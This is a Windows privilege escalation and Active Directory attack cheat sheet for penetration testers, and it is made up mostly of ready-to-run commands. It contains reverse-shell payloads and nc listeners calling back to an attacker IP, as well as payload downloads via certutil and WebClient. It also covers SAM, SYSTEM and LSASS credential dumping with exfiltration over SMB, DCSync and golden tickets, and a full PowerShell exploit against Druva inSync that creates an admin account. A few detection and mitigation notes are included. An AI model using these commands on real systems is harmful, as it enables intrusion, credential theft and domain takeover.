# Windows Privilege Escalation Cheat Sheet

A field reference for moving from a low-privilege Windows account to `NT
AUTHORITY\SYSTEM`, plus the Active Directory pivot path that often follows.
Focuses on 2024-2026 techniques: BadSuccessor (Windows Server 2025 dMSA
abuse), the modern Potato family, ADCS ESC15/ESC16, NTLM relay evolution,
and the credential harvesting patterns that still work on patched hosts.
Commands assume cmd unless prefixed with `PS>` for PowerShell.

Advanced Windows exploitation reading list:
<https://github.com/yeyintminthuhtut/Awesome-Advanced-Windows-Exploitation-References>

---

## 1. Methodology in one paragraph

After landing a shell, run the same loop: **Who am I and what privileges do I
have?** (`whoami /priv`, `whoami /groups`), **What is the box?**
(`systeminfo`, `wmic product`, `tasklist /svc`), and **What can I write to
that SYSTEM will execute or read?** (service binaries, unquoted paths,
scheduled tasks, DLL search order, registry auto-run). On a domain joined
host, also enumerate the domain immediately: BloodHound CE, Kerberoasting,
AS-REP roasting, ADCS templates (ESC1-ESC17), and the BadSuccessor dMSA
path on Server 2025. Token impersonation (the Potato family) remains the
single most reliable local privesc when you hold SeImpersonate.

---

## 2. Initial enumeration

### System and user

```
whoami /all
whoami /priv
whoami /groups
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe list brief                       # installed patches, find missing KBs
tasklist /svc
net user
net localgroup
net localgroup Administrators
net accounts                              # password policy
```

PowerShell equivalents and richer output:

```
PS> Get-LocalUser | Select Name,Enabled,LastLogon
PS> Get-LocalGroupMember Administrators
PS> Get-ComputerInfo | Select OsName,OsVersion,OsBuildNumber
PS> Get-HotFix | Select HotFixID,InstalledOn
PS> [System.Environment]::OSVersion.Version                # build number for CVE matching
```

### Network and services

```
ipconfig /all
route print
arp -a
netstat -ano
net start
sc query state= all
wmic service get Name,DisplayName,PathName,StartName | findstr /v "C:\Windows"
tasklist /v
```

Find services with non-default paths (likely installed software, not patched
by Windows Update):

```
wmic service get Name,PathName,StartName | findstr /v "C:\Windows"
```

### Installed software and versions

```
wmic product get name,version,vendor
dir "C:\Program Files" "C:\Program Files (x86)"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr /i "DisplayName DisplayVersion"
```

`wmic product` is slow and incomplete; cross-check desktop shortcuts,
`Get-ItemProperty HKLM:\...\Uninstall\*` in PowerShell.

### Automated enumeration

```
# WinPEAS - the PEASS family for Windows
.\winPEASx64.exe
.\winPEASx86.exe

# PrivescCheck - itm4n, integrates LOLDrivers for BYOVD detection
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$env:COMPUTERNAME -Format TXT,HTML,CSV,XML"
# PSv2/CLM bypass:
Get-Content .\PrivescCheck.ps1 | Out-String | Invoke-Expression
# Download: https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1

# PowerUp - classic PowerSploit privesc checks
Import-Module .\PowerUp.ps1
Invoke-AllChecks
Invoke-PrivescAudit

# Seatbelt - GhostPack, lots of system info
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=Misc -outputFile=seatbelt.txt

# SharpUp - subset of PowerUp in C#
.\SharpUp.exe

# Watson / Sherlock - missing KB / CVE matching
.\Watson.exe
.\Sherlock.ps1

# BloodHound CE / SharpHound for AD
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp
# Remote, no shell (BloodHound.py CE branch):
bloodhound-ce-python -u user -p 'pass' -d domain.local -dc-ip 10.10.10.10 -c all
```

---

## 3. Credential harvesting (always do this first)

### Unattended install files

```
C:\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattended\Unattended.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
type C:\Windows\Panther\Unattended.xml | findstr /i password
```

### PowerShell history

```
cmd /c type "%userprofile%\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt"
PS> (Get-PSReadlineOption).HistorySavePath
```

### Saved Windows credentials

```
cmdkey /list
runas /savecred /user:admin cmd.exe
```

### IIS and web config

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config
type C:\inetpub\wwwroot\web.config | findstr connectionString
```

### PuTTY and other saved sessions

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
# Also check: WinSCP, FileZilla, RDP saved sessions, mRemoteNG, VNC, browsers
```

### Vault, Credential Manager, autologon

```
cmdkey /list
PS> Get-StoredCredential
PS> Get-CachedCredential
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

### DPAPI and browser cookies

```
# SharpChrome / SharpWeb / SharpDPAPI from GhostPack
.\SharpChrome.exe logins
.\SharpDPAPI.exe masterkeys
.\SharpDPAPI.exe credentials
```

### WiFi keys

```
netsh wlan show profile
netsh wlan show profile name="<SSID>" key=clear
```

### AlwaysInstallElevated

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1, MSI runs as SYSTEM
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o malicious.msi
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

---

## 4. Service abuse

Service Control Manager (SCM) launches each service's executable. Each
service also has a Discretionary Access Control List (DACL) saying who can
reconfigure it. All service configs live under
`HKLM\SYSTEM\CurrentControlSet\Services\` with values `ImagePath` (binary
path), `ObjectName` (run-as account), and `Security` (DACL). Use Process
Hacker or `sc` for the GUI/CLI view.

```
sc qc <service-name>                      # query config
accesschk64.exe -accepteula -qlc <service-name>     # check DACL
icacls "<binary-path>"                    # check file ACL
wmic service get Name,PathName,StartName
```

### Insecure permissions on the service executable

If `icacls` shows `Everyone:(M)` or `BUILTIN\Users:(F)` on the binary path:

```
sc qc <service-name>
icacls "C:\Program Files\app\service.exe"
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe-service -o svc.exe
certutil -urlcache -f http://<ip>/svc.exe C:\Users\Public\svc.exe
move "C:\Program Files\app\service.exe" "C:\Program Files\app\service.exe.bkp"
move C:\Users\Public\svc.exe "C:\Program Files\app\service.exe"
# Switch to cmd if in PowerShell (sc is Set-Content alias in PS)
sc stop <service-name>
sc start <service-name>
```

### Unquoted service paths

When `ImagePath` is unquoted and contains spaces, Windows tries each prefix:
`C:\Program.exe`, `C:\Program Files\app.exe`, etc. Exploitable only if one
of those prefixes is in a world-writable directory.

```
wmic service get Name,PathName | findstr /i "Program Files"
# For each unquoted path, walk the dir ACLs:
icacls "C:\Program Files\app"
icacls "C:\Program Files"
# Look for BUILTIN\Users with (AD) append or (WD) write
# Drop a reverse shell named after the first prefix, then start the service
```

### Insecure service DACL (reconfigure the service)

If `accesschk` shows `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG` for
`BUILTIN\Users`:

```
accesschk64.exe -accepteula -uwcqv *
sc config <service-name> binPath= "C:\Users\Public\svc.exe" obj= LocalSystem
sc stop <service-name>
sc start <service-name>
```

PowerUp wrappers:

```
PS> Invoke-ServiceAbuse -Name <svc> -Command "net localgroup Administrators pwn /add"
PS> Restore-ServiceBinary -Name <svc>
PS> Write-ServiceBinary -Name <svc> -Command "..."
```

---

## 5. DLL hijacking and search order

Windows searches for DLLs in this order: directory of the calling process,
then `System32`, then `Windows`, then current dir, then `PATH`. A writable
directory early in the chain plus a missing DLL = your DLL loads as the
service.

```
# Find services with writable binary directories
for /f "tokens=2 delims=:=" %s in ('sc qc ^| findstr BINARY_PATH') do icacls "%s"
# Or use Process Monitor with filter Path ends with .dll, Result NAME NOT FOUND
# Common targets: Program Files app folders, PATH entries writable by Users
```

Tools: Process Monitor (procmon), `Find-DllHijack` in PowerUp, `PrivescCheck`.

---

## 6. Scheduled tasks

```
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User"
schtasks /query /tn <task> /fo LIST /v
icacls "<path\to\task\script>"
# If writable:
echo C:\Users\Public\nc.exe -e cmd.exe <attacker-ip> <port> > "<path\to\task>"
schtasks /run /tn <task>
```

Find tasks running as SYSTEM with a writable action:

```
schtasks /query /fo LIST /v | findstr /i "Run As User:\sSYSTEM"
# Cross-reference task action paths against icacls output
```

---

## 7. Token privileges and the Potato family

```
whoami /priv
# Look for: SeImpersonate, SeAssignPrimaryToken, SeDebug, SeBackup, SeRestore,
# SeTakeOwnership, SeLoadDriver, SeTcb, SeManageVolume, SeCreateToken
```

Privilege reference: <https://github.com/gtworek/Priv2Admin>
<https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants>

### SeImpersonate / SeAssignPrimaryToken

The most reliable local privesc on modern Windows. Hold it from IIS AppPool,
MSSQL, LOCAL SERVICE, NETWORK SERVICE, scheduled task service accounts, etc.

`whoami /priv | findstr /i impersonate`

JuicyPotato is legacy on Windows 10 1809+/Server 2019+. Use the successors.
The Potato Garden (https://github.com/0xSebin/The-Potato-Garden) curates 18
variants:

| Tool | When to use |
|------|-------------|
| PrintSpoofer | Print Spooler running (disabled post-PrintNightmare on hardened hosts) |
| RoguePotato | OXID resolver reachable on TCP/135, use a redirector if egress blocked |
| SharpEfsPotato / EfsPotato | EFSRPC pipes (lsarpc, efsrpc, samr, lsass, netlogon) |
| GodPotato | Windows 8/8.1-11, Server 2012-2022, .NET runtime present |
| SigmaPotato | GodPotato fork, in-memory reflection, .NET 2.0 core build |
| PrintNotifyPotato | PrintNotify COM service, works when Spooler is disabled |
| DCOMPotato | DCOM service objects, PrinterNotify or McpManagement variants |
| DeadPotato | GodPotato + post-ex modules (Mimikatz, SharpHound, Defender off), noisy |
| LocalPotato | NTLM local authentication reflection (CVE-2023-21746) |
| MultiPotato | Accepts multiple trigger methods |
| PetitPotato | PetitPotam-style local coercion |
| AppxPotato | Appx deployment service abuse |
| RasManPotato | RasMan service abuse |
| CandyPotato | Updated RottenPotato variant |
| BravePotato | Brave browser service abuse |
| ADCSCoercePotato | ADCS web enrollment coercion |
| RogueWinRM | WinRM disabled, BITS service triggers auth to port 5985 |

Quick commands:

```
:: PrintSpoofer
PrintSpoofer.exe -c "c:\tools\nc.exe <ip> <port> -e cmd"
PrintSpoofer.exe -i -c "cmd"        :: interactive

:: RoguePotato (needs redirector on TCP/135 if egress blocked)
:: On attacker redirector:
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM:9999
:: On victim:
RoguePotato.exe -r <redirector-ip> -c "nc.exe <ip> <port> -e cmd" -l 9999

:: GodPotato
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe <ip> <port>"

:: SigmaPotato (reflection, no disk touch)
PS> [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("http://<ip>/SigmaPotato.exe"))
PS> [SigmaPotato]::Main("cmd /c whoami")
PS> [SigmaPotato]::Main(@("--revshell","<ip>","4444"))

:: PrintNotifyPotato
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami

:: EfsPotato (try alternative pipes if one is blocked)
EfsPotato.exe "whoami"
EfsPotato.exe "whoami" lsarpc
EfsPotato.exe "whoami" efsrpc

:: NTLM-Relay-to-SYSTEM (PrivEscalator) - COM server hijacking
PrivEscalator.exe -m Auto -p "C:\Windows\System32\cmd.exe"
PrivEscalator.exe -p ncat.exe -a "-lvnp 443 -e cmd.exe"
```

If `whoami /priv` shows a filtered token without SeImpersonate (common for
LOCAL SERVICE/NETWORK SERVICE), restore default privileges first:

```
FullPowers.exe -c "cmd /c whoami /priv" -z
```

### SeBackupPrivilege / SeRestorePrivilege

Read any file regardless of ACL (Backup) or write any file (Restore).

```
:: Classic SAM/SYSTEM dump via reg save
reg save hklm\system C:\Users\Public\system.hive
reg save hklm\sam    C:\Users\Public\sam.hive
reg save hklm\security C:\Users\Public\security.hive
:: Exfiltrate via SMB share on attacker:
python3 /opt/impacket/examples/smbserver.py -smb2support -u user -p pass public share
copy C:\Users\Public\sam.hive    \\<ip>\public\
copy C:\Users\Public\system.hive \\<ip>\public\
:: Crack hashes:
python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
:: Pass the hash:
python3 /opt/impacket/examples/psexec.py -hashes <hash> administrator@<ip>
```

VSS + robocopy backup mode is more reliable for locked files:

```
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\config C:\Temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\Temp ntds.dit        :: on a DC
```

### SeTakeOwnershipPrivilege

Take ownership of any object, then grant yourself full control.

```
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant <user>:F
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
:: Lock the session, press Win+U (Ease of Access) to get SYSTEM cmd
```

Useful files to take over for credentials:

```
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\*.sav
c:\inetpub\wwwroot\web.config
```

### SeDebugPrivilege

Open and duplicate tokens of SYSTEM processes, or dump memory.

```
:: Dump LSASS (blocked if RunAsPPL / LSA Protection enabled)
procdump -accepteula -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

:: Copy token from a non-PPL SYSTEM process
PS> Import-Module .\psgetsys.ps1
PS> [MyProcess]::CreateProcessFromParent(<system_pid>, "cmd.exe")
```

If LSASS is PPL-protected, steal a token from another non-PPL SYSTEM process
(winlogon, services) or use a PPL bypass/BYOVD chain.

### SeLoadDriverPrivilege (BYOVD)

Load a signed but vulnerable kernel driver, then use its IOCTLs for kernel
R/W or to disable security tooling. PrivescCheck integrates LOLDrivers
(<https://www.loldrivers.io/api/drivers.csv>) for detection.

```
fltMC sysmondrv                      :: unload Sysmon driver
:: BYOVD: load a signed driver with known vuln, escalate to kernel
:: Note: Microsoft vulnerable driver blocklist and HVCI break older chains
::       like szkg64.sys on modern Windows 11/Server builds.
:: Blocklist updated quarterly: https://aka.ms/VulnerableDriverBlockList
:: HVCI/Memory Integrity is the strongest mitigation.
```

Registry path under HKCU: `\Registry\User\<RID>\System\CurrentControlSet\Services\<Driver>`
with `ImagePath` and `Type=1` (SERVICE_KERNEL_DRIVER).

### SeManageVolumePrivilege

Raw volume handle I/O bypasses NTFS ACLs. Read any file by block, including
CA private keys for Golden Certificate attacks.

### Enable all disabled privileges

```
PS> .\EnableAllTokenPrivs.ps1
PS> whoami /priv
```

---

## 8. 2025-2026 Windows CVEs

### CVE-2025-26633 - MSC EvilTwin LPE (CVSS 7.8)

Affects Windows 10/11 and Server 2016-2025, patched March 2025. Malformed
`.msc` (MMC snap-in) file triggers arbitrary code execution when opened in
`mmc.exe`. Actively exploited by Water Gamayun APT as a zero-day before
patching. PoC creates a local admin.

```
git clone https://github.com/mbanyamer/MSC-EvilTwin-Local-Privilege-Escalation
python3 CVE-2025-26633_mmc_addadmin.py
# Creates user "hacker" / "P@ssw0rd123!"
```

Detection: monitor `mmc.exe` spawning child processes, `.msc` execution
from user-writable locations, Event ID 4688.

### CVE-2025-54918 - Windows NTLM EoP (CVSS 8.8)

Network-based NTLM authentication bypass. Race condition in NTLM Session
Key Derivation allows a malformed SPN in the NTLM negotiate packet to reuse
a stale session key, authenticating as SYSTEM. Patched September 2025.

```
# Recon + harvest + relay chain
responder -i eth0 -f
python3 impacket/secretsdump.py <victim-ip> <user>
python3 impacket/ntlmrelay.py <victim-ip> <target-ip>
# Metasploit auxiliary/windows/ntlm_bypass
```

Mitigation: `LmCompatibilityLevel=3`, install KB on all DCs, disable NTLM
where possible. Part of the 2025 NTLM bug surge (also CVE-2025-53778,
CVE-2025-21311). Often chained with CVE-2025-55226 (win32k.sys graphics
race RCE, patched Sept 16 2025).

### CVE-2025-55234 - Windows SMB Privilege Escalation

SMB stack privilege escalation, companion to CVE-2025-54918. 2025 saw a
surge in SMB vulnerabilities. Detection focuses on SMB session key overwrite
and NTLM negotiate anomalies.

### CVE-2025-62215 - Windows Kernel Double-Free LPE

Race condition in the Windows kernel leading to a double-free, allowing LPE
to SYSTEM. Requires Administrator rights per the PoC (limits real-world
privesc value, more useful as sandbox escape). Uses multithreaded handle
manipulation and heap spraying.

```
git clone https://github.com/abrewer251/CVE-2025-62215_Windows_Kernel_PE
cl.exe poc.cpp /Od /ZI /RTC1 /MDd /link /OUT:unicorn.exe
```

### CVE-2025-53779 - BadSuccessor (Windows Server 2025 dMSA abuse)

The flagship 2025 AD privesc. Affects Windows Server 2025 domain
controllers (dMSA feature introduced here). Works in default config; the
domain need not use dMSAs, the mere existence of the feature is
exploitable. Discovered by Akamai (Yuval Gordon), disclosed at DEF CON
2025. Vulnerable builds < 10.0.26100.4851.

Root cause: KDC builds the PAC based solely on the
`msDS-ManagedAccountPrecededByLink` attribute with no verification of
legitimate migration. An attacker with CreateChild rights on any OU can
create a dMSA, link it to a target (e.g. Domain Admin), and request a TGT
that carries the target's RIDs in the PAC.

Prerequisites: any domain user with CreateChild (or
`Create msDS-DelegatedManagedServiceAccount`) rights on any OU. Found in
91% of examined environments. No permissions on the target account needed.

```
# 1. Find OU with CreateChild rights
Get-DomainObjectAcl -Identity "OU=Staff,DC=domain,DC=com" | ?{$_.ActiveDirectoryRights -match "CreateChild"}

# 2. Create dMSA and link to target
New-ADServiceAccount -Path "OU=Staff,DC=domain,DC=com" -Name attacker_dmsa
# Grant self GenericAll, set msDS-ManagedAccountPrecededByLink = target DN
# Set msDS-DelegatedMSAState = 2

# 3. Request TGT via Rubeus (dMSA support added Nov 2024, PR #194)
Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/DOMAIN /dmsa /opsec /nowrap /ptt /ticket:<Machine TGT>

# Full automation:
git clone https://github.com/R8Sec/BadSuccessor
.\BadSuccessor.ps1 -TargetOU "OU=Staff,DC=domain,DC=com"

# Defender scan:
git clone https://github.com/akamai/BadSuccessor
.\Get-BadSuccessorOUPermissions.ps1
```

Bonus: the `KERB-DMSA-KEY-PACKAGE` `previous-keys` field contains the
superseded account's RC4-HMAC key, enabling offline credential compromise
of any user/computer.

Post-patch (Aug 27 2025): direct escalation closed, KDC now requires mutual
pairing. But the attribute remains writable, so BadSuccessor persists as a
shadow credentials alternative and DCSync alternative in owned domains.

Detection: Event 5137 (dMSA creation), Event 5136 (modifications to
`msDS-ManagedAccountPrecededByLink` / `msDS-DelegatedMSAState`), Event 2946
(dMSA TGT with `KERB-DMSA-KEY-PACKAGE`).

Mitigation: patch DCs, restrict CreateChild for dMSA object type (GUID
`0feb936f-47b3-49f2-9386-1dedc2c23765`), dedicated `dMSA-Admins` group,
quarterly OU ACL review.

---


## 9. Unquoted path / autorun / DLL hijack automated

```
# PowerUp
Invoke-AllChecks
# Look for: UnquotedPath, ModifiableServiceBinary, ModifiableServicePath,
#           RegistryAutoLogon, AlwaysInstallElevated, ModifiableScheduledTask
```

---

## 10. Unpatched software

```
wmic product get name,version,vendor
# wmic product misses a lot; check Program Files, shortcuts, services
# Search exploit-db / packet storm / Google for each "name version"
```

### Case study: Druva inSync 6.6.3 (RPC path traversal to SYSTEM)

Druva runs an RPC server on port 6064 as SYSTEM, localhost only. Procedure
5 runs any command. A patch checked the command started with
`C:\ProgramData\Druva\inSync4\`, but path traversal bypasses it.

```powershell
$ErrorActionPreference = "Stop"
$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect("127.0.0.1", 6064)
$header   = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType  = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command  = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd")
$length   = [System.BitConverter]::GetBytes($command.Length)
$s.Send($header); $s.Send($rpcType); $s.Send($length); $s.Send($command)
# Then log in as pwnd / SimplePass123
```

---

## 11. Active Directory pivot

### Kerberoasting

```
# Impacket (from Linux)
impacket-GetUserSPNs <domain>/<user>:<pass> -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt
# Rubeus (from Windows) - use /ldaps and /opsec for stealth
Rubeus.exe kerberoast /rc4opsec /ldaps /outfile:hashes.txt
```

### AS-REP roasting

```
impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat -no-pass
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
# Rubeus preauthscan for accounts not requiring pre-auth:
Rubeus.exe preauthscan /users:users.txt /domain:corp.local
```

### Pass the hash / pass the key / overpass the hash

```
impacket-psexec    -hashes <hash> administrator@<ip>
impacket-wmiexec   -hashes <hash> administrator@<ip>
impacket-smbexec  -hashes <hash> administrator@<ip>
impacket-atexec   -hashes <hash> administrator@<ip> "cmd"
impacket-secretsdump -hashes <hash> administrator@<ip>
:: Overpass the hash (PTK) with Rubeus
Rubeus.exe asktgt /user:<user> /rc4:<ntlm> /ptt /opsec
:: Diamond ticket - forge TGT from a legit TGT without krbtgt key
Rubeus.exe diamond /user:user /password:pass /krbkey:KEY /ticketuser:administrator /groups:512
```

### BloodHound CE (Community Edition)

BloodHound Legacy (v4) is deprecated/archived. CE (v6) is the future: Go
REST API backend, PostgreSQL app DB, Neo4j graph DB, React frontend. In
2025, OpenGraph integration extends beyond AD/Azure to diverse identity
platforms (Okta, GitHub, AWS IAM) via a connector library.

```
# Remote collection, no shell needed (CE branch)
bloodhound-ce-python -u <user> -p '<pass>' -d domain.local -dc-ip 10.10.10.10 -c all
# SharpHound from a shell (v2.X, SpecterOps)
SharpHound.exe -c All --zipfilename out.zip
SharpHound.exe -c DCOnly --stealth
SharpHound.exe -c Session,LoggedOn --loop --loopduration 02:00:00
SharpHound.exe -c Container,Group,ACL,ObjectProps --searchforest
```

### ADCS (Active Directory Certificate Services) abuse

Certipy (v5.0.3) now supports ESC1-ESC17 as of 2026.

```
# Enumerate vulnerable templates
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.10 -vulnerable
Certify.exe find /vulnerable
Certify.exe cas

# ESC1 - enrollee supplies subject, Client Auth EKU, low-priv enrol
certipy req -u user@domain.local -p 'Password123' -dc-ip 10.10.10.10 \
  -target CA.domain.local -ca 'domain-CA' -template 'VulnTemplate' \
  -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# ESC15 (CVE-2024-49019) - Arbitrary Application Policy Injection ("EKUwu")
# Affects unpatched CAs (pre-Nov 2024). Schema V1 templates with
# CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT. Inject arbitrary Application Policies.
certipy req -u user -p pass -ca 'CA' -template 'VulnV1' -application-policies <OIDs>

# ESC16 - Security Extension Disabled on CA
# CA globally configured to NOT include szOID_NTDS_CA_SECURITY_EXT SID
# extension. Behaves as if ALL templates are ESC9. Exploitable when
# StrongCertificateBindingEnforcement=0/1 (compatibility mode, default
# until Feb 2025; full enforcement Sept 2025).
# Combined with ESC6, works even under full enforcement (mode 2).

# ESC8 - NTLM relay to HTTP enrollment endpoint
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
python3 PetitPotam.py <attacker-ip> <dc-ip>        # coerce auth
certipy auth -pfx dc.pfx -dc-ip 10.10.10.10

# Shadow Credentials (write msDS-KeyCredentialLink)
certipy shadow auto -u user@domain.local -p 'Password123' -account 'target$'
```

Microsoft strong certificate mapping enforcement timeline:
`StrongCertificateBindingEnforcement=2` (full) became default for new
domains Feb 2025, existing domains Sept 2025.

### Kerberos relay (KrbRelayUp)

```
# Local privesc via Kerberos relay when LDAP signing not enforced
KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount \
  -ComputerName PC$ -ComputerPassword Pass123
KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount \
  -ComputerName PC$ -ComputerPassword Pass123 -Method ADCS -CAEndpoint CA.domain.local
```

### Coerced authentication (force a SYSTEM/DC to authenticate to you)

Coercer (https://github.com/p0dalirius/Coercer) bundles 12+ RPC methods:

```
coercer coerce -t target -u user -p pass -d domain -l attacker_ip
coercer scan -t target --filter-protocol-name MS-EFSR
coercer fuzz --targets-file hosts.txt -l attacker_ip
```

Individual tools:

```
# PetitPotam (MS-EFSR) - coerce DC to relay to ADCS
python3 PetitPotam.py <attacker-ip> <dc-ip>
# PrinterBug (MS-RPRN) - coerce print server auth
python3 printerbug.py domain/user:pass@<target> <attacker-ip>
# DFSCoerce (MS-DFSNM)
python3 dfscoerce.py -u user -p pass <attacker-ip> <target>
# ShadowCoerce (MS-FSRVP)
python3 shadowcoerce.py -d domain -u user -p password LISTENER TARGET
# CheeseOunce (MS-EVEN) - newer, now in Coercer
```

### IPv6 DNS takeover (mitm6)

```
sudo mitm6 -d domain.local
# In another terminal, relay to LDAPS
sudo ntlmrelayx.py -6 -t ldaps://<dc-ip> -wh fakewpad.domain.local -l loot
# Kerberos relay variant:
sudo mitm6 -d domain.local --relay dc01.domain.local
```

mitm6 wins because Windows prefers IPv6 and trusts DHCPv6 advertisements.
The victim's WPAD lookup goes to your relay. RA guard does not equal DHCPv6
guard.

### Mimikatz post-Domain-Admin

```
mimikatz # lsadump::dcsync /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /all
mimikatz # sekurlsa::logonpasswords
mimikatz # kerberos::golden /user:Administrator /domain:domain.local \
          /sid:<SID> /krbtgt:<hash> /id:500 /ptt
mimikatz # kerberos::golden /domain:domain.local /sid:<SID> \
          /target:<host> /service:cifs /rc4:<hash> /user:Administrator /ptt
```

---

## 12. Quick win checklist

- [ ] Run `winPEASx64.exe` and `PrivescCheck` (with LOLDrivers), read red lines.
- [ ] `whoami /priv` -> SeImpersonate? Potato family (section 7).
- [ ] `whoami /priv` -> SeBackup/SeRestore/SeDebug/SeTakeOwnership/SeLoadDriver.
- [ ] `Invoke-AllChecks` (PowerUp) for services, paths, AlwaysInstallElevated.
- [ ] `schtasks /query /fo LIST /v` for writable SYSTEM tasks.
- [ ] Unquoted service paths with writable parent dirs.
- [ ] Credential loot: unattended, PS history, cmdkey, IIS, PuTTY, DPAPI.
- [ ] `wmic product` -> exploit-db each version.
- [ ] Server 2025 DC? BadSuccessor (CVE-2025-53779) dMSA abuse.
- [ ] Domain joined: BloodHound CE, Kerberoast, AS-REP, ADCS ESC1-ESC17, relay.
- [ ] Missing KBs -> Windows CVEs (CVE-2025-26633, CVE-2025-54918, CVE-2026-33825, etc).
- [ ] Nightmare-Eclipse tooling: BlueHammer (CVE-2026-33825), RedSun, UnDefend,
      YellowKey, GreenPlasma, MiniPlasma, LegacyHive. Check Defender platform
      version >= 4.18.26050.3011. Look for `FunnyApp.exe`, `RedSun.exe`,
      `undef.exe`, `z.exe` in user-writable dirs.
- [ ] BYOVD: check LOLDrivers against blocklist and HVCI status.

---

## 13. References

- PayloadsAllTheThings Windows Privesc: <https://github.com/swisskyrepo/PayloadsAllTheThings>
- Priv2Admin: <https://github.com/gtworek/Priv2Admin>
- HackTricks Windows Local Privesc: <https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation>
- The Potato Garden: <https://github.com/0xSebin/The-Potato-Garden>
- RoguePotato/PrintSpoofer: <https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/>
- GodPotato: <https://github.com/BeichenDream/GodPotato>
- SigmaPotato: <https://github.com/tylerdotrar/SigmaPotato>
- PrintNotifyPotato: <https://github.com/BeichenDream/PrintNotifyPotato>
- EfsPotato: <https://github.com/zcgonvh/EfsPotato>
- DCOMPotato: <https://github.com/zcgonvh/DCOMPotato>
- FullPowers: <https://github.com/itm4n/FullPowers>
- NTLM-Relay-to-SYSTEM: <https://github.com/Yareshms/NTLM-Relay-to-SYSTEM>
- WinPEAS: <https://github.com/carlospolop/PEASS-ng>
- PrivescCheck: <https://github.com/itm4n/PrivescCheck>
- PowerUp / PowerSploit: <https://github.com/PowerShellMafia/PowerSploit>
- Seatbelt / SharpUp: <https://github.com/GhostPack>
- LOLDrivers: <https://www.loldrivers.io>
- BloodHound CE: <https://github.com/SpecterOps/BloodHound>
- SharpHound: <https://github.com/SpecterOps/SharpHound>
- BloodHound.py: <https://github.com/dirkjanm/BloodHound.py>
- Certipy: <https://github.com/ly4k/Certipy>
- Certify: <https://github.com/GhostPack/Certify>
- Rubeus: <https://github.com/GhostPack/Rubeus>
- Coercer: <https://github.com/p0dalirius/Coercer>
- PetitPotam: <https://github.com/ly4k/PetitPotam>
- mitm6: <https://github.com/dirkjanm/mitm6>
- BadSuccessor: <https://github.com/akamai/BadSuccessor>
- BadSuccessor automation: <https://github.com/R8Sec/BadSuccessor>
- AD BadSuccessor Audit: <https://github.com/sxyrxyy/AD-BadSuccessor-Audit>
- CVE-2025-26633 PoC: <https://github.com/mbanyamer/MSC-EvilTwin-Local-Privilege-Escalation>
